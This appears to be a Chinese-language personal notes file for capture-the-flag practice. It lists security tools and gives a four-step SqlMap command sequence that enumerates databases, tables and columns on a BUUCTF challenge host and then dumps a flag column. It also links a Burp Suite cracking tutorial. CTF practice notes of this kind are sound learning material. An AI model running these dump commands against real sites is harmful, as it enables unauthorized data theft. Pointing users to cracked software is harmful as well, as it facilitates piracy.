## 工具


### SqlMap

### OWASP ZAP

### Burp Suite

破解教程：http://www.52pjb.net/xiazai/36163.html#xzdz

### Stegotools

作用：查看图像的隐写情况。

使用：在tools下运行```jar ./Stegsolve.jar```命令即可。

### GitHack

详情请见·```Githack```文件夹下的```README.md```

### SqlMap

使用步骤：
1. 查看数据库名称：
```
python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 --dbs
```
2. 查看目标数据库的表,note表示目标表。
```
python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables
```
3. 查看数据库表字段
```
python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables -T fl4g --columns
```

4. 查看目标字段的值
```
python sqlmap.py http://b1a4b711-121f-431c-a658-19db3107b04c.node4.buuoj.cn:81/index.php?id=1 -D note --tables -T fl4g -C f111ag --dump
```

最后得到```flag```。

### 其他

1. F5隐写工具使用：https://zhuanlan.zhihu.com/p/480561261